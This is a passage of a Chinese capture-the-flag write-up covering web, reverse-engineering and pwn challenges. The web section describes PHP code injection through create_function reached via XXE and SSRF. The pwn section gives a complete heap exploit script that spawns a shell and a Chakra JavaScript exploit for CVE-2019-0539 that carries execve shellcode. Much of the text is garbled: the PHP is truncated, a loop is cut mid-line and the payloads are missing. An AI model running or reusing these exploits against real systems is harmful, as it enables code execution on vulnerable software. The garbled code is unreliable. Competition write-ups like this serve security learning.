    }
8、那么就再来读读 views 下的 Admin.php。
    ]>
        RSS解析失败
            此网站RSS资源可能存在错误无法解析
            此网站RSS资源可能已经关闭
            此网站可能禁止PHP获取此内容
            可能由于来自本站的访问过多导致暂时访问限制Orz
            channel->link;?>" target="_blank">channel->title;?>
            channel->link;?>
            channel->description;?>
            channel->lastBuildDate)&&$rss->channel->lastBuildDate!=""){
                    echo " 最后更新:".rss_sort_date($rss->channel->lastBuildDate)."";
                }
            ?>
        channel->item as $item){
            $data[] = $item;
        }
        usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
        foreach($data as $item){    
        ?>
                link;?>" target="_blank">title;?>
                        description;?>
                    pubDate);?>
                    category);$i++){
                            echo $item->category[$i];
                            if($i+1!=count($item->category)){
                                echo ",";
                            }
                        };
                        if(isset($item->author)&&$item->author!=""){
                    ?>
                    author;
                        }
                    ?>
        免责声明:本站只提供RSS解析,解析内容与本站无关,版权归来源网站所有
分析下源码，主要是这里有意思，
    usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
看到没，直接将 $order 拼到函数体里了。那么这里我们就可以利用这里 RCE 了。  
当然这里来源 IP 必须为 127.0.0.1，和上面 routes 里的对上了。  
9、来利用那个 XXE 来搞个 SSRF，访问这个页面，rss_url 可以随意传个正常的，order 需要插我们要执行的恶意代码。
    ]>
得到返回，看到 flag 文件名。  
10、读下这个文件。
    ]>
##
# **Reverse：**
## easy_rust
直接载入IDA 发现是rust的，很多没用的函数 ，就是做各种检查的，应该是编译的时候带进来的，直接忽略，发现主函数的位置有一个反调试，
直接干掉，就可以在IDA里面调试了。  
下面的处理很乱，大概的我都是调试总结出来的 。  
这里其实就是验证输入的内容是不是 a-z 0-9，后面调试发现 其实只能固定在 a-h o 1 - 3 这几个字符。  
下面就是交换字节，四个交换都类似这样，格式是 要交换的 字符+交换的方向  
只有 1 2 3 a 这几种方式。判断是华容道游戏 调试把内存中的数据提取出来，  
'd', 'c', 'o',  
'h', 'a', 'e',  
'b', 'g', 'f'  
方块移动的规则  
1 向上  
2 向下  
3 向右  
a 向左  
找个脚本跑了一下 ，对应的  
c右a上h右b上g左h下b右d下a左b上e左f上  
flag： c3a1h3b1gah2b3d2aab1eaf1
## NaughtyBoy
分析apk以后发现没什么东西，都在so文件里面，直接去逆向so文件，发现是一个游戏，  
四个都打开，配合着看，我发现IDA解析他们不太一样。有的结构比较清晰。  
验证了头部flag  
地图生成函数  
直接复制下来，去vs里面跑一下，  
地图出来了 ，然后圈圈提取出来，爆破出前四位是 good  
然后下面就是走了 ，因为最下面有验证质数的，所以如果路过一个圈圈，会覆盖过去  
最后会检查质数，但是24 也就是图的中间位置是不用满足的，所以图中间就是那个0x4f  
bytectf{good53233212414531}
## 驱动逆向
直接加载会蓝屏，所以我先IDA分析了一通，发现了蹊跷的地方，在取CPUID的地方给数组赋值了，然后还去计算了MD5。但是CPUID是每台电脑不同的，所以根据提示设置了
“FakeIntel”作为ID ，就是FakeIntel + 0xDEADBEEF 。然后计算每四个字节计算一次MD5 最后取前八位组合在一起。  
key ： 52 a9 65 08 c3 95 36 f0 c2 42 53 9b 77 17 fb c6 1e 31 55 17 41 69 36 05
c0 5a 39 b9 53 28 3d 94  
IV直接给出来 ： 25 40 5a 86 b5 f1 3e 58 80 9b db 0b 30 49 66 8c  
发现我直接用python的AES解不出来。 所以我windbg调试起来，要先NOP掉一个有问题的函数，在解密函数的位置设置内存  
直接让驱动把解密完成。
# **Pwn**** :**
## mheap
add未检查size的大小，add总数超过size时，read返回值会是-1，向上写入单链表指针，后面攻击list没啥好说的
    from pwn import *
    p = remote("112.126.98.5",9999)
    def add(idx, size, content):
        p.recvuntil("choice: ")
        p.sendline("1")
        p.recvuntil("Index: ")
        p.sendline(str(idx))
        p.recvuntil("size: ")
        p.sendline(str(size))
        p.recvuntil("Content: ")
        p.send(str(content))
    def show(idx):
        p.recvuntil("choice: ")
        p.sendline("2")
        p.recvuntil("Index: ")
        p.sendline(str(idx))
    def remove(idx):
        p.recvuntil("choice: ")
        p.sendline("3")
        p.recvuntil("Index: ")
        p.sendline(str(idx))
    def modify(idx,content):
        p.recvuntil("choice: ")
        p.sendline("4")
        p.recvuntil("Index: ")
        p.sendline(str(idx))
        p.sendline(content)
    add(0,3840 + 0x10, "\n")
    add(1,80,"x"*80)
    remove(1)
    #raw_input()
    add(2,256,p64(0x60)+p64(0x4040e0)+"x"*(0xd0-1)+"\n")
    add(1,80,"x"+"\n")
    add(2,0x23330000,p64(0x404050)+"\n")
    show(2)
    libc_addr = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))-0x40680
    system_addr = 0x4f440 + libc_addr
    modify(2,p64(system_addr))
    p.recvuntil("choice: ")
    p.sendline("/bin/sh\x00")
    p.interactive()
## childjs
chakra引擎直接用的过去的漏洞  
CVE-2019-0539  
由于JIT引擎判断InitProto操作并不会带来副作用，对象类型不会发生变化，导致了类型混淆漏洞。  
网上存在分析文章  
直接使用文中利用dateview实现任意地址读写的方法，对poc进行修改。  
之后通过内存布局，将要泄露的对象放在数组中摆放在dataview后面进行实现对象地址的泄露。  
通过entrypoint劫持的方法，使程序执行shellcode
    var convert = new ArrayBuffer(0x100);
    var u32 = new Uint32Array(convert);
    var f64 = new Float64Array(convert);
    var BASE = 0x100000000;
    function hex(x) {
        return `0x${x.toString(16)}`
    }
    function bytes_to_u64(bytes) {
        return (bytes[0]+bytes[1]*0x100+bytes[2]*0x10000+bytes[3]*0x1000000
                    +bytes[4]*0x100000000+bytes[5]*0x10000000000);
    }
    function i2f(x) {
        u32[0] = x % BASE;
        u32[1] = (x - (x % BASE)) / BASE;
        return f64[0];
    }
    function f2i(x) {
        f64[0] = x;
        return u32[0] + BASE * u32[1];
    }
    let shellcode = [0.1,0.2,0.3,0.4];
    let shellcode_addr = 0x0;
    obj = {}
    obj.a = 1;
    obj.b = 2;
    obj.c = 3;
    obj.d = 4;
    obj.e = 5;
    obj.f = 6;
    obj.g = 7;
    obj.h = 8;
    obj.i = 9;
    obj.j = 10;
    dv1 = new DataView(new ArrayBuffer(0x100));
    dv2 = new DataView(new ArrayBuffer(0x100));
    tm=[shellcode,shellcode,shellcode,shellcode,123]
    BASE = 0x100000000;
    function hex(x) {
        return "0x" + x.toString(16);
    }
    function opt(o, proto, value) {
        o.b = 1;
        let tmp = {__proto__: proto};
        o.a = value;
    }
    function main() {
        for (let i = 0; i auxSlots = obj (Step 1)
        o.c = dv1; // obj->auxSlots = dv1 (Step 2)
        obj.h = tm; // dv1->buffer = dv2 (Step 3)
        let read64 = function(addr_lo, addr_hi) {
            // dv2->buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
            // read from addr (Step 5)
            return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
        }
        let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
            // dv2->buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
            // write to addr (Step 5)
            dv2.setInt32(0, value_lo, true);
            dv2.setInt32(4, value_hi, true);
        }
        // get dv2 vtable pointer
        vtable_lo = dv1.getUint32(48, true);
        vtable_hi = dv1.getUint32(52, true);
        print (hex(vtable_lo + vtable_hi * BASE));
    obj.h =dv2;
       dv1.setUint32(0x38, vtable_lo, true);
        dv1.setUint32(0x3C, vtable_hi, true);
        vtable_lo = dv2.getUint32(32, true);
        vtable_hi = dv2.getUint32(36, true);
     print (hex(vtable_lo + vtable_hi * BASE));
     dv1.setUint32(0x38, vtable_lo, true);
        dv1.setUint32(0x3C, vtable_hi, true);
       lo=dv2.getUint32(8, true);
     hi = dv2.getUint32(12, true);
    print (hex(lo + hi * BASE));
      write64(lo+24, hi, vtable_lo+88, vtable_hi);
         dv1.setUint32(0x38, vtable_lo+88, true);
      dv1.setUint32(0x3C, vtable_hi, true);
    let shell=[106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5]
    for (let i = 0; i < shell.length; i++) {
        dv2.setUint8(i, shell[i]);
    }
    shellcode();